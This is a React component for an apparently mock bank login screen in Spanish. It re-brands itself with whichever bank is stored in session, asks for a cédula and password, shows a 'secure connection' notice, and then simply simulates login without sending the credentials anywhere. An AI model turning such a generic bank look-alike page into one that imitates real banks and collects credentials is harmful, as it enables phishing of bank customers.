import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './S3aNuLogin.css';

export default function S3aNuLogin() {
  const navigate = useNavigate();
  const [cedula, setCedula] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [bank, setBank] = useState(null);

  useEffect(() => {
    // Leer información del banco seleccionado
    const bankStr = sessionStorage.getItem('selectedBank');
    if (bankStr) {
      setBank(JSON.parse(bankStr));
    }
  }, []);

  async function handleLogin(e) {
    e.preventDefault();
    if (!cedula || !password) return;

    setLoading(true);
    // Simulate login delay
    setTimeout(() => {
      // Store login state
      sessionStorage.setItem('bankLoggedIn', 'true');
      navigate('/nu-payment-auth');
    }, 800);
  }

  if (!bank) {
    return <div>Cargando...</div>;
  }

  return (
    <>
      {/* Bank branded header */}
      <div className="nu-header" style={{
        background: `linear-gradient(135deg, ${bank.color}CC 0%, ${bank.color}B3 100%)`
      }}>
        <div className="nu-header-decoration" />

        <div className="nu-header-top">
          <button className="nu-back" onClick={() => navigate('/')}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5">
              <polyline points="15 18 9 12 15 6"/>
            </svg>
          </button>
          <div className="bank-logo" style={{ backgroundColor: 'rgba(255, 255, 255, 0.2)' }}>
            <svg width="32" height="32" viewBox="0 0 60 60" fill="white">
              <text x="50%" y="50%" dominantBaseline="middle" textAnchor="middle" fontSize="24" fontWeight="bold">
                {bank.name.substring(0, 2).toUpperCase()}
              </text>
            </svg>
          </div>
        </div>

        <div className="nu-header-front">
          <div className="nu-wordmark">{bank.name}</div>
          <div className="nu-subtitle">Inicia sesión con tu cuenta</div>
        </div>
      </div>

      <div className="screen-body">
        <div className="login-container">
          <h2 className="login-title">Bienvenido a {bank.name}</h2>
          <p className="login-desc">Ingresa tus credenciales para continuar</p>

          <form onSubmit={handleLogin} className="login-form">
            {/* Cédula input */}
            <div className="form-group">
              <label htmlFor="cedula">Cédula de ciudadanía</label>
              <div className="input-wrapper" data-bank-color={bank.color}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" strokeWidth="2">
                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                  <circle cx="12" cy="7" r="4"/>
                </svg>
                <input
                  id="cedula"
                  type="text"
                  placeholder="Ej: 1234567890"
                  value={cedula}
                  onChange={(e) => setCedula(e.target.value.replace(/\D/g, ''))}
                  maxLength="10"
                  autoComplete="off"
                  className="form-input"
                />
              </div>
            </div>

            {/* Password input */}
            <div className="form-group">
              <label htmlFor="password">Contraseña</label>
              <div className="input-wrapper" data-bank-color={bank.color}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" strokeWidth="2">
                  <rect x="3" y="11" width="18" height="11" rx="2"/>
                  <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </svg>
                <input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Ingresa tu contraseña"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  autoComplete="current-password"
                  className="form-input"
                />
                <button
                  type="button"
                  className="toggle-password"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? (
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" strokeWidth="2">
                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                      <circle cx="12" cy="12" r="3"/>
                    </svg>
                  ) : (
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" strokeWidth="2">
                      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                      <line x1="1" y1="1" x2="23" y2="23"/>
                    </svg>
                  )}
                </button>
              </div>
            </div>

            {/* Security notice */}
            <div className="card security-notice" style={{
              background: `linear-gradient(135deg, ${bank.color}15 0%, ${bank.color}08 100%)`,
              border: `1.5px solid ${bank.color}30`
            }}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={bank.color} strokeWidth="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
              </svg>
              <p>Conexión segura · Tus datos están protegidos</p>
            </div>

            {/* Submit button */}
            <button
              type="submit"
              className="btn-primary login-btn"
              style={{ backgroundColor: bank.color }}
              disabled={!cedula || !password || loading}
            >
              {loading ? 'Iniciando sesión...' : 'Iniciar sesión'}
              {!loading && (
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                  <polyline points="9 18 15 12 9 6"/>
                </svg>
              )}
            </button>

            {/* Help links */}
            <div className="help-links">
              <a href="#" onClick={(e) => e.preventDefault()} style={{ color: bank.color }}>¿Olvidaste tu contraseña?</a>
              <span className="separator">·</span>
              <a href="#" onClick={(e) => e.preventDefault()} style={{ color: bank.color }}>Ayuda</a>
            </div>
          </form>
        </div>
      </div>
    </>
  );
}
